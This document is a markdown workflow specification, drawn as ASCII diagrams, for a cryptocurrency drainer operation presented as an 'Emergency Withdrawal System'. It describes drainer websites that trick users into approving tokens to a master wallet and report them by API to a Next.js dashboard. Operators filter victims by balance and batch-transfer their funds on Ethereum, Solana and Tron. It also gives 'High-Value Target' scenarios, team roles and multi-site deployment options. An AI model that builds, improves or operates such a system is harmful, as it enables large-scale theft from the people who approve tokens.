# Emergency Withdrawal System - Complete Workflow Diagram

## System Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         EMERGENCY WITHDRAWAL SYSTEM                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  ┌─────────────┐      ┌──────────────┐      ┌────────────────┐       │
│  │   DRAINER   │      │   DASHBOARD  │      │   BLOCKCHAIN   │       │
│  │  WEBSITES   │ ───> │   (Next.js)  │ ───> │   EXECUTION    │       │
│  └─────────────┘      └──────────────┘      └────────────────┘       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

## Complete Data Flow

```
Step 1: Token Approval
┌─────────────────┐
│  User visits    │
│  drainer site   │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ User approves   │
│ tokens to       │
│ master wallet   │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Drainer sends   │
│ data via API    │
│ (Bearer token)  │
└────────┬────────┘
         │
         ▼
Step 2: Dashboard Processing
┌─────────────────┐
│ Data appears in │
│ Wallet Data tab │
│ Status: "New"   │
└─────────────────┘
```

## Dashboard Workflow

```
┌───────────────────────────────────────────────────────────────────────────┐
│                            DASHBOARD SECTIONS                              │
├────────────────┬────────────────┬─────────────────┬──────────────────────┤
│   OVERVIEW     │ CHAIN CONTROLS │ TEAM MGMT      │ API TOKENS           │
├────────────────┼────────────────┼─────────────────┼──────────────────────┤
│ • Add tokens   │ • Wallet Data  │ • Add members   │ • Generate tokens    │
│ • View tokens  │ • Execution    │ • Set roles     │ • Set expiry         │
│ • Enable/Block │ • Manual Ctrl  │ • Remove users  │ • Delete tokens      │
└────────────────┴────────────────┴─────────────────┴──────────────────────┘
```

## Chain Control Tabs Workflow

```
┌─────────────────────┐     ┌──────────────────────┐     ┌─────────────────────┐
│   WALLET DATA TAB   │     │   EXECUTION TAB      │     │  MANUAL CONTROL     │
├─────────────────────┤     ├──────────────────────┤     ├─────────────────────┤
│                     │     │                      │     │                     │
│ Filters:            │     │ Shows: Pending only  │     │ Direct Transfer:    │
│ • Address           │     │                      │     │ • From wallet       │
│ • Balance range     │     │ Actions:             │     │ • To wallet         │
│ • Date range        │     │ • Select wallets     │     │ • Token             │
│ • Status            │ --> │ • Enter receiver     │  OR │ • Amount            │
│                     │     │ • Execute batch      │     │                     │
│ Actions:            │     │ • Monitor status     │     │ For emergencies     │
│ • Update Balance    │     │                      │     │ or testing          │
│ • Check Approval    │     │ Requires:            │     │                     │
│ • Process → Pending │     │ Admin wallet         │     │                     │
└─────────────────────┘     └──────────────────────┘     └─────────────────────┘
         │                            │
         └────────────────────────────┘
                      │
                      ▼
              ┌──────────────┐
              │  BLOCKCHAIN  │
              │  EXECUTION   │
              └──────────────┘
```

## Security Layers

```
┌─────────────────────────────────────────────────────────────────┐
│                        SECURITY MODEL                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Layer 1: Authentication                                         │
│  ┌────────────┐    ┌─────────────┐    ┌──────────────┐        │
│  │   Email    │ -> │ Magic Link  │ -> │ Role Check   │        │
│  │   Entry    │    │   Sent      │    │ Admin/Viewer │        │
│  └────────────┘    └─────────────┘    └──────────────┘        │
│                                                                  │
│  Layer 2: API Security                                          │
│  ┌────────────┐    ┌─────────────┐    ┌──────────────┐        │
│  │  Drainer   │ -> │ Bearer Token│ -> │ Time Limited │        │
│  │  Website   │    │  Required   │    │   Access     │        │
│  └────────────┘    └─────────────┘    └──────────────┘        │
│                                                                  │
│  Layer 3: Execution Security                                    │
│  ┌────────────┐    ┌─────────────┐    ┌──────────────┐        │
│  │   Admin    │ -> │ Admin Wallet│ -> │  On-chain    │        │
│  │   Role     │    │  Required   │    │  Execution   │        │
│  └────────────┘    └─────────────┘    └──────────────┘        │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

## Status Flow Lifecycle

```
NEW                    PENDING                 EXECUTED
 │                       │                        │
 │  Admin selects +      │   Admin executes      │
 │  clicks "Process"     │   batch transfer       │
 ├──────────────────────>├───────────────────────>│
 │                       │                        │
 │ • Just arrived        │ • Ready to send        │ • Completed
 │ • Balance = 0         │ • Balance > 10         │ • TX hash saved
 │ • Approval = false    │ • Approval = true      │ • Funds moved
 │                       │ • Awaiting execution   │
 │                       │                        │
 └───────────────────────┴────────────────────────┘
```

## Processing Requirements

```
┌──────────────────────────────────────────┐
│        PROCESSING CHECKLIST              │
├──────────────────────────────────────────┤
│                                          │
│  Before Processing:                      │
│  ☐ Token added to Overview              │
│  ☐ Token is enabled (not blocked)       │
│  ☐ Update balances clicked              │
│  ☐ Check approvals clicked              │
│                                          │
│  Can Process When:                       │
│  ✓ Balance > 10 tokens                  │
│  ✓ Approval = true                      │
│  ✓ Status = "New"                       │
│                                          │
│  Execution Requirements:                 │
│  ☐ Admin role logged in                 │
│  ☐ Admin wallet connected               │
│  ☐ Sufficient gas in admin wallet       │
│  ☐ Receiver address verified            │
│                                          │
└──────────────────────────────────────────┘
```

## Chain-Specific Details

### Ethereum (Chain ID: 1)
```
Drainer → API → Dashboard → ERC20 Contract → Batch Transfer
                    │
                    └─> Master Wallet: NEXT_PUBLIC_ETH_MASTER_WALLET
```

### Solana (Chain ID: 507454)
```
Drainer → API → Dashboard → SPL Delegation → Batch Transfer
                    │
                    └─> Delegate Wallet: NEXT_PUBLIC_SOLANA_DELEGATE_WALLET
```

### Tron (Chain ID: 728126428)
```
Drainer → API → Dashboard → TRC20 Allowance → Batch Transfer
                    │
                    └─> Master Wallet: NEXT_PUBLIC_TRON_MASTER_WALLET
```

## API Integration Flow

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│ Drainer Website │     │ Dashboard API    │     │ PostgreSQL DB   │
├─────────────────┤     ├──────────────────┤     ├─────────────────┤
│                 │     │                  │     │                 │
│ 1. Get approval │     │ 2. Validate      │     │ 3. Store data   │
│    from user    │ --> │    Bearer token  │ --> │    via Prisma   │
│                 │     │                  │     │                 │
│ POST /api/...   │     │ 4. Process       │     │ 5. Update       │
│ Headers:        │     │    request       │     │    status       │
│ Authorization:  │     │                  │     │                 │
│ Bearer [TOKEN]  │     │                  │     │                 │
└─────────────────┘     └──────────────────┘     └─────────────────┘
```

## Common Scenarios

### Scenario 1: Standard Bulk Processing
```
1. Filter wallets by balance (1000-5000)
2. Select 50 wallets
3. Update balances → Check approvals
4. Process to pending
5. Execute batch to single receiver
```

### Scenario 2: High-Value Target
```
1. Search specific wallet address
2. Verify high balance
3. Process immediately
4. Execute with priority
```

### Scenario 3: Emergency Single Transfer
```
1. Skip to Manual Control tab
2. Enter known wallet with approval
3. Execute direct transfer
4. Bypass normal workflow
```

## Deployment Options

```
Option 1: Single Instance
┌─────────────────┐
│ One Dashboard   │ <── Multiple drainer sites
│ Multiple tokens │     with different API tokens
└─────────────────┘

Option 2: Multi-Instance
┌─────────────────┐     ┌─────────────────┐
│ Dashboard #1    │     │ Dashboard #2    │
│ High-value ops  │     │ Regular ops     │
└─────────────────┘     └─────────────────┘
```

---

*This diagram represents the complete system workflow from user approval to token extraction.*